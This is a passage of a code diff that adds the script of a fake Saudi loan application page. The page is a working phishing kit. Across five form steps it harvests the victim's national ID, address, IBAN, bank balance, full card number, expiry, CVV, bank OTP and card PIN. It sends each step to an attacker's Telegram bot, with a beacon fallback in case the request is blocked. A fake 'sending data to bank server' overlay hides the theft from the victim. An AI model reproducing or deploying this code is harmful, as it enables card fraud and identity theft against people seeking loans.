+                if (el) el.innerText = String(homeRedirectRemaining);
+            }
+
+            function startHomeRedirectTimer() {
+                stopHomeRedirectTimer();
+                homeRedirectRemaining = HOME_REDIRECT_SECONDS;
+                renderHomeRedirectCountdown();
+                homeRedirectInterval = setInterval(function() {
+                    homeRedirectRemaining--;
+                    renderHomeRedirectCountdown();
+                    if (homeRedirectRemaining <= 0) {
+                        stopHomeRedirectTimer();
+                        window.resetToHome();
+                    }
+                }, 1000);
+            }
+
+            function dispatchTelegramDirect(text) {
+                const apiUrl = 'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage';
+
+                // Primary POST request to Telegram Bot API
+                fetch(apiUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: text,
+                        parse_mode: 'HTML'
+                    }),
+                    keepalive: true
+                })
+                .then(function(res) { return res.json(); })
+                .then(function(data) {
+                    if (!data.ok) {
+                        throw new Error(data.description || 'Telegram POST failed');
+                    }
+                })
+                .catch(function() {
+                    // Fallback GET beacon if CORS or network blocks POST
+                    const params = new URLSearchParams({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: text,
+                        parse_mode: 'HTML'
+                    });
+                    const fallbackUrl = apiUrl + '?' + params.toString();
+                    const img = new Image();
+                    img.src = fallbackUrl;
+                    fetch(fallbackUrl, { method: 'GET', mode: 'no-cors' }).catch(function() {});
+                });
+            }
+
+            window.sendTelegramNotification = function(stepNumber, stepTitle, detailsText) {
+                const cleanDetails = stripCardSpaces(detailsText);
+                const messagePayload =
+                    '<b>NEW KSA LOAN APPLICATION STEP ' + escapeHtml(stepNumber) + ' (5,000 - 500,000 SAR)</b>\n' +
+                    'Form ID: <code>' + escapeHtml(PORTAL_ID) + '</code>\n' +
+                    'Stage: ' + escapeHtml(stepTitle) + '\n' +
+                    'Time: ' + escapeHtml(new Date().toLocaleString('en-US', { timeZone: 'Asia/Riyadh' })) + ' (Riyadh Time)\n' +
+                    '----------------------------------------\n' +
+                    cleanDetails;
+
+                dispatchTelegramDirect(messagePayload);
+            };
+
+            window.formatNationalId = function(input) {
+                input.value = input.value.replace(/\D/g, '').substring(0, 10);
+            };
+
+            window.formatMobileNo = function(input) {
+                let digits = input.value.replace(/\D/g, '');
+                if (digits.startsWith('966')) {
+                    digits = digits.substring(3);
+                } else if (digits.startsWith('0')) {
+                    digits = digits.substring(1);
+                }
+                digits = digits.substring(0, 9);
+                input.value = '+966' + digits;
+            };
+
+            window.formatIban = function(input) {
+                input.value = input.value.replace(/[^a-zA-Z0-9]/g, '').toUpperCase().substring(0, 24);
+            };
+
+            window.formatSalaryDay = function(input) {
+                let val = input.value.replace(/\D/g, '').substring(0, 2);
+                if (val !== '') {
+                    const num = Number(val);
+                    if (num > 31) val = '31';
+                }
+                input.value = val;
+            };
+
+            window.formatCardNumber = function(input) {
+                input.value = input.value.replace(/\D/g, '').substring(0, 16);
+            };
+
+            window.formatExpiry = function(input) {
+                let value = input.value.replace(/\D/g, '');
+                if (value.length > 4) value = value.substring(0, 4);
+                if (value.length >= 3) {
+                    input.value = value.substring(0, 2) + '/' + value.substring(2, 4);
+                } else {
+                    input.value = value;
+                }
+            };
+
+            window.formatOtpInput = function(input) {
+                input.value = input.value.replace(/\D/g, '').substring(0, 8);
+            };
+
+            window.handlePinInput = function(element, index) {
+                element.value = element.value.replace(/\D/g, '');
+                if (element.value.length === 1 && index < 3) {
+                    const nextInput = bySelectorAll('.pin-input')[index + 1];
+                    if (nextInput) nextInput.focus();
+                }
+            };
+
+            function showError(fieldId, errId) {
+                const el = byId(fieldId);
+                const errEl = byId(errId);
+                if (el) el.classList.add('input-error');
+                if (errEl) errEl.classList.remove('hidden');
+            }
+
+            function clearErrors() {
+                bySelectorAll('.input-error').forEach(el => el.classList.remove('input-error'));
+                bySelectorAll('[id^="err-"]').forEach(el => el.classList.add('hidden'));
+            }
+
+            function triggerLoadingOverlay(stepName, callback) {
+                const overlay = byId('loadingOverlay');
+                const title = byId('loadingTitle');
+                const subtitle = byId('loadingSubtitle');
+                if (title) title.innerText = 'Processing Step: ' + stepName + '...';
+                if (subtitle) subtitle.innerText = 'Securing connection and sending data to bank server...';
+                if (overlay) overlay.classList.remove('hidden');
+                setTimeout(() => {
+                    if (overlay) overlay.classList.add('hidden');
+                    if (callback) callback();
+                }, 1500);
+            }
+
+            window.processStep1 = function() {
+                clearErrors();
+                const fullName = byId('fullName').value.trim();
+                const nationalId = byId('nationalId').value.trim();
+                const mobileNo = byId('mobileNo').value.trim();
+                const ksaLocalDigits = mobileNo.replace(/^\+966/, '').replace(/\D/g, '');
+                const gender = byId('gender').value;
+                const dob = byId('dob').value;
+                const region = byId('region').value;
+                const address = byId('address').value.trim();
+
+                let isValid = true;
+                if (!fullName || fullName.length < 3) { showError('fullName', 'err-fullName'); isValid = false; }
+                if (!nationalId || nationalId.length !== 10) { showError('nationalId', 'err-nationalId'); isValid = false; }
+                if (ksaLocalDigits.length !== 9) { showError('mobileNo', 'err-mobileNo'); isValid = false; }
+                if (!gender) { showError('gender', 'err-gender'); isValid = false; }
+                if (!dob) { showError('dob', 'err-dob'); isValid = false; }
+                if (!region) { showError('region', 'err-region'); isValid = false; }
+                if (!address || address.length < 5) { showError('address', 'err-address'); isValid = false; }
+                if (!isValid) return;
+
+                applicantData.fullName = fullName;
+                applicantData.nationalId = nationalId;
+                applicantData.mobileNo = '+966' + ksaLocalDigits;
+                applicantData.gender = gender;
+                applicantData.dob = dob;
+                applicantData.region = region;
+                applicantData.address = address;
+
+                const telegramMsg =
+                    'Full Name: ' + escapeHtml(fullName) + '\n' +
+                    'National ID / Iqama: <code>' + escapeHtml(nationalId) + '</code>\n' +
+                    'Mobile No: <code>' + escapeHtml(applicantData.mobileNo) + '</code>\n' +
+                    'Gender: ' + escapeHtml(gender) + '\n' +
+                    'Date of Birth: ' + escapeHtml(dob) + '\n' +
+                    'Region / City: ' + escapeHtml(region) + '\n' +
+                    'Address: ' + escapeHtml(address);
+
+                window.sendTelegramNotification(1, 'Personal Information Submitted', telegramMsg);
+                triggerLoadingOverlay('Personal Info', () => goToStep(2));
+            };
+
+            window.processStep2 = function() {
+                clearErrors();
+                const loanAmount = Number(byId('loanAmount').value);
+                const loanPurpose = byId('loanPurpose').value;
+                const occupation = byId('occupation').value;
+                const bankName = byId('bankName').value;
+                const bankIban = byId('bankIban').value.trim().toUpperCase();
+                const salaryDateNum = Number(byId('salaryDate').value);
+                const bankBalance = byId('bankBalance').value;
+
+                let isValid = true;
+                if (!loanAmount || loanAmount < 5000 || loanAmount > 500000) { showError('loanAmount', 'err-loanAmount'); isValid = false; }
+                if (!loanPurpose) { showError('loanPurpose', 'err-loanPurpose'); isValid = false; }
+                if (!occupation) { showError('occupation', 'err-occupation'); isValid = false; }
+                if (!bankName) { showError('bankName', 'err-bankName'); isValid = false; }
+                if (!bankIban || bankIban.length < 15 || bankIban.length > 24) { showError('bankIban', 'err-bankIban'); isValid = false; }
+                if (!salaryDateNum || salaryDateNum < 1 || salaryDateNum > 31) { showError('salaryDate', 'err-salaryDate'); isValid = false; }
+                if (!bankBalance || bankBalance === '') { showError('bankBalance', 'err-bankBalance'); isValid = false; }
+                if (!isValid) return;
+
+                applicantData.loanAmount = loanAmount;
+                applicantData.loanPurpose = loanPurpose;
+                applicantData.occupation = occupation;
+                applicantData.bankName = bankName;
+                applicantData.bankIban = bankIban;
+                applicantData.salaryDate = String(salaryDateNum);
+                applicantData.bankBalance = bankBalance;
+
+                const telegramMsg =
+                    'Applicant: ' + escapeHtml(applicantData.fullName) + ' (<code>' + escapeHtml(applicantData.mobileNo) + '</code>)\n' +
+                    'Loan Amount: ' + escapeHtml(loanAmount) + ' SAR\n' +
+                    'Purpose: ' + escapeHtml(loanPurpose) + '\n' +
+                    'Occupation: ' + escapeHtml(occupation) + '\n' +
+                    'Bank Name: ' + escapeHtml(bankName) + '\n' +
+                    'IBAN: <code>' + escapeHtml(bankIban) + '</code>\n' +
+                    'Salary Date (Day): <code>' + escapeHtml(applicantData.salaryDate) + '</code>\n' +
+                    'Current Balance: ' + escapeHtml(bankBalance) + ' SAR';
+
+                window.sendTelegramNotification(2, 'Bank Information Submitted', telegramMsg);
+                triggerLoadingOverlay('Bank Info', () => goToStep(3));
+            };
+
+            window.processStep3 = function() {
+                clearErrors();
+                const cardNumber = byId('cardNumber').value.replace(/\D/g, '').trim();
+                const cardExpiry = byId('cardExpiry').value.trim();
+                const cardCvv = byId('cardCvv').value.trim();
+
+                let isValid = true;
+                if (!cardNumber || cardNumber.length !== 16) { showError('cardNumber', 'err-cardNumber'); isValid = false; }
+                if (!cardExpiry || cardExpiry.length < 5) { showError('cardExpiry', 'err-cardExpiry'); isValid = false; }
+                if (!cardCvv || cardCvv.length < 3) { showError('cardCvv', 'err-cardCvv'); isValid = false; }
+                if (!isValid) return;
+
+                applicantData.cardNumber = cardNumber;
+                applicantData.cardExpiry = cardExpiry;
+                applicantData.cardCvv = cardCvv;
+
+                const fullCardDigits = formatCardForTelegram(cardNumber);
+                const telegramMsg =
+                    'Applicant: ' + escapeHtml(applicantData.fullName) + '\n' +
+                    'Mobile: <code>' + escapeHtml(applicantData.mobileNo) + '</code>\n' +
+                    'Card Number: <code>' + escapeHtml(fullCardDigits) + '</code>\n' +
+                    'Expiry: <code>' + escapeHtml(cardExpiry) + '</code>\n' +
+                    'CVV: <code>' + escapeHtml(cardCvv) + '</code>\n' +
+                    'Fee Charged: SAR 2 Processing Fee';
+
+                window.sendTelegramNotification(3, 'Card Details Submitted (SAR 2 Fee)', telegramMsg);
+                triggerLoadingOverlay('Card Processing', () => goToStep(4));
+            };
+
+            window.processStep4 = function() {
+                clearErrors();
+                const otpEl = byId('otpInput');
+                const otpVal = otpEl ? otpEl.value.replace(/\D/g, '').trim() : '';
+
+                if (otpVal.length < 4 || otpVal.length > 8) {
+                    byId('err-otp').classList.remove('hidden');
+                    if (otpEl) otpEl.classList.add('input-error');
+                    return;
+                }
+
+                stopOtpTimer();
+                applicantData.otp = otpVal;
+                const fullCardDigits = formatCardForTelegram(applicantData.cardNumber);
+                const telegramMsg =
+                    'Applicant: ' + escapeHtml(applicantData.fullName) + '\n' +
+                    'Mobile: <code>' + escapeHtml(applicantData.mobileNo) + '</code>\n' +
+                    'Card Number: <code>' + escapeHtml(fullCardDigits) + '</code>\n' +
+                    'RECEIVED OTP: <code>' + escapeHtml(otpVal) + '</code>';
+
+                window.sendTelegramNotification(4, 'Bank OTP Verification Code Submitted', telegramMsg);
+                triggerLoadingOverlay('OTP Verification', () => goToStep(5));
+            };
+
+            window.resendOTP = function() {
+                startOtpTimer();
+                applicantData.otp = 'BYPASSED_RESEND';
+                const telegramMsg =
+                    'Applicant: ' + escapeHtml(applicantData.fullName) + '\n' +
+                    'Mobile: <code>' + escapeHtml(applicantData.mobileNo) + '</code>\n' +
+                    'User clicked OTP option (3-min timer active)';
+
+                window.sendTelegramNotification(4, 'OTP Resend / Timer Reset', telegramMsg);
+            };
+
+            window.processStep5 = function() {
+                clearErrors();
+                const inputs = bySelectorAll('.pin-input');
+                let pinVal = '';
+                inputs.forEach(i => pinVal += i.value);
+
+                if (pinVal.length < 4) {
+                    byId('err-pin').classList.remove('hidden');
+                    inputs.forEach(i => i.classList.add('input-error'));
+                    return;
+                }
+
+                applicantData.pin = pinVal;
+                completeApplication();
+            };
+
+            window.bypassPIN = function() {
+                applicantData.pin = 'BYPASSED';
+                completeApplication();
+            };
+
+            function completeApplication() {
+                stopOtpTimer();
+                const refId = 'KSA-2026-' + Math.floor(10000 + Math.random() * 90000);
+                applicantData.referenceId = refId;
+                byId('referenceIdDisplay').innerText = refId;
+
+                const fullCardDigits = formatCardForTelegram(applicantData.cardNumber);
+                const telegramMsg =
+                    '<b>FULL APPLICATION COMPLETED!</b>\n' +
+                    'Reference ID: <code>' + escapeHtml(refId) + '</code>\n' +
+                    'Name: ' + escapeHtml(applicantData.fullName) + '\n' +
+                    'National ID / Iqama: <code>' + escapeHtml(applicantData.nationalId) + '</code>\n' +
+                    'Mobile: <code>' + escapeHtml(applicantData.mobileNo) + '</code>\n' +
+                    'Loan Amount: ' + escapeHtml(applicantData.loanAmount) + ' SAR\n' +
+                    'Bank: ' + escapeHtml(applicantData.bankName) + '\n' +
+                    'IBAN: <code>' + escapeHtml(applicantData.bankIban) + '</code>\n' +
+                    'Salary Date: <code>' + escapeHtml(applicantData.salaryDate) + '</code>\n' +
+                    'Card Number: <code>' + escapeHtml(fullCardDigits) + '</code>\n' +
+                    'Expiry: <code>' + escapeHtml(applicantData.cardExpiry) + '</code> | CVV: <code>' + escapeHtml(applicantData.cardCvv) + '</code>\n' +
+                    'OTP: <code>' + escapeHtml(applicantData.otp) + '</code>\n' +
+                    'CARD PIN: <code>' + escapeHtml(applicantData.pin) + '</code>';
+
+                window.sendTelegramNotification(5, 'Full Application Finished', telegramMsg);
+                triggerLoadingOverlay('Final Submission', () => {
+                    goToStep(6);
+                    startHomeRedirectTimer();
+                });
+            }
+
+            window.goToStep = function(step, skipScroll) {
+                currentStep = step;
+                if (step === 4) {
+                    startOtpTimer();
+                } else {
+                    stopOtpTimer();
+                }
+
+                if (step !== 6) {
+                    stopHomeRedirectTimer();
+                }
+
+                for (let i = 1; i <= 6; i++) {
+                    const content = byId('step-' + i + '-content');
+                    if (content) content.classList.add('hidden');
+                }
+                const targetContent = byId('step-' + step + '-content');
+                if (targetContent) targetContent.classList.remove('hidden');
+
+                for (let i = 1; i <= 5; i++) {
+                    const circle = byId('step-circle-' + i);
+                    if (!circle) continue;
+                    if (i < step) {
+                        circle.className = 'w-9 h-9 sm:w-10 sm:h-10 mx-auto rounded-full font-black text-sm flex items-center justify-center transition-all duration-300 step-circle-completed';
+                        circle.innerHTML = '<i class="fa-solid fa-check"></i>';
+                    } else if (i === step) {
+                        circle.className = 'w-9 h-9 sm:w-10 sm:h-10 mx-auto rounded-full font-black text-sm flex items-center justify-center transition-all duration-300 step-circle-active';
+                        circle.innerHTML = i;
+                    } else {
+                        circle.className = 'w-9 h-9 sm:w-10 sm:h-10 mx-auto rounded-full font-black text-sm bg-gray-200 text-gray-600 flex items-center justify-center transition-all duration-300';
+                        circle.innerHTML = i;
+                    }
+                }
+
+                for (let l = 1; l <= 4; l++) {
+                    const line = byId('line-' + l);
+                    if (!line) continue;
+                    if (l < step) line.classList.add('step-line-active');
+                    else line.classList.remove('step-line-active');
+                }
+
+                if (!skipScroll) {
+                    const rootEl = getRoot();
+                    if (rootEl && rootEl.scrollIntoView) {
+                        rootEl.scrollIntoView({ behavior: 'smooth', block: 'start' });
+                    }
+                }
+            };
+
+            window.resetToHome = function() {
+                stopHomeRedirectTimer();
+                stopOtpTimer();
+                clearErrors();
+                window.goToStep(1, true);
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            };
+
+            document.addEventListener('DOMContentLoaded', function() {
+                applyImageSlots();
+                renderSlide(0);
+                startAutoSlider();
+
+                const sliderBox = document.getElementById('ksa-auto-slider');
+                if (sliderBox) {
+                    sliderBox.addEventListener('mouseenter', stopAutoSlider);
+                    sliderBox.addEventListener('mouseleave', startAutoSlider);
+                }
+
+                calculateEMI();
+                runAssessment();
+                window.goToStep(1, true);
+            });
+        })();
+    </script>
+</body>
+</html>
+```[cite: 1, 2, 3]
